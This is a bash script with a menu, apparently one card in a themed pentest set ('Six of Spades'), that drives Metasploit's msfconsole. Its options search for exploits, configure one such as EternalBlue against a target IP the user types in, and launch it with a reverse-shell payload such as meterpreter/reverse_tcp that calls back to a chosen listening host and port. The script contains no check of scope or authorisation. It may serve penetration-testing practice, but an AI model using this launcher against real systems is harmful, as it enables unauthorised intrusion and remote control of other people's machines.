#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'

msfconsole_card() {
    while true; do
        clear
        echo -e "${CYAN}"
        echo "     __________________________________________"
        echo "    |               Six of Spades              |"
        echo "    |  Leverage Metasploit for Controlled      |"
        echo "    |                 Exploits                 |"
        echo "    |__________________________________________|"
        echo "    |                                          |"
        echo "    |  1. Search for Exploits                  |"
        echo "    |  2. Set up an Exploit                    |"
        echo "    |  3. Run Payload for a Target             |"
        echo "    |  4. Exit                                 |"
        echo "    |__________________________________________|"
        echo -e "${RESET}"

        read -p "Choice: " choice
        case $choice in
            1)
                clear
                echo -e "${CYAN}Searching for exploits in Metasploit...${RESET}"
                read -p "Enter a search term (e.g., Windows, Linux): " search_term
                echo "Searching for exploits matching '$search_term'..."
                msfconsole -q -x "search $search_term; exit"
                ;;
            2)
                clear
                echo -e "${CYAN}Setting up an exploit in Metasploit...${RESET}"
                read -p "Enter the exploit name (e.g., exploit/windows/smb/ms17_010_eternalblue): " exploit_name
                read -p "Enter the target IP: " target_ip
                echo "Setting up $exploit_name for target $target_ip..."
                msfconsole -q -x "use $exploit_name; set RHOSTS $target_ip; show options; exit"
                ;;
            3)
                clear
                echo -e "${CYAN}Running payload against a target...${RESET}"
                read -p "Enter the exploit name: " exploit_name
                read -p "Enter the payload name (e.g., windows/meterpreter/reverse_tcp): " payload_name
                read -p "Enter the target IP: " target_ip
                read -p "Enter the listening IP: " lhost
                read -p "Enter the listening port: " lport
                echo "Launching exploit with $payload_name against $target_ip..."
                msfconsole -q -x "use $exploit_name; set PAYLOAD $payload_name; set RHOSTS $target_ip; set LHOST $lhost; set LPORT $lport; run; exit"
                ;;
            4)
                echo -e "${CYAN}Exiting...${RESET}"
                break
                ;;
            *)
                echo -e "${CYAN}Invalid choice. Try again.${RESET}"
                ;;
        esac
        echo -e "${CYAN}Press any key to return to the menu...${RESET}"
        read -n 1 -s
    done
}

msfconsole_card
